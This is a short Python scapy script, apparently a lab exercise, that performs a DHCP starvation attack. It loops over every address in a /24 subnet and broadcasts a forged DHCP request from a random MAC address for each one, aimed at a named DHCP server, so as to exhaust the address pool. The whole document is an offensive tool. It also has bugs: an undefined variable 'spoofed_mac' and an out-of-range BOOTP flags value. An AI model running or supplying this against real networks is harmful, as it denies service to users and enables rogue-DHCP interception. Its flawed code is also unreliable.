# on importe la lib scapy
from scapy.all import *
import ipaddress

# Variables
network = '10.1.10.0/24'
ipServerDHCP = '10.1.30.1'
networkInterface= 'enp0s9'

# List all ips in the network
possibleIps = [str(ip) for ip in ipaddress.IPv4Network(network)]

# Proceed to build all the dhcp request and to send them
for ip in possibleIps:

    macSrc=RandMAC()


    ethernet = Ether(
        src=macSrc,
        dst="ff:ff:ff:ff:ff:ff"
        )

    internetProtocol = IP(
        src="0.0.0.0", 
        dst="255.255.255.255"
        )

    udp = UDP(
        sport=68,
        dport=67
        )
    
    
    bootp = BOOTP(
        chaddr=mac2str(spoofed_mac),
        xid=random.randint(1, 1000000000),
        flags=0xFFFFFF
        )


    dhcp = DHCP(options=[
        ("message-type", "request"),
        ("server_id", ipServerDHCP),
        ("requested_addr", ip),
        ("end")
        ])

    dhcpRequest = ethernet/internetProtocol/udp/bootp/dhcp

    sendp(dhcpRequest,iface=networkInterface, verbose=0)

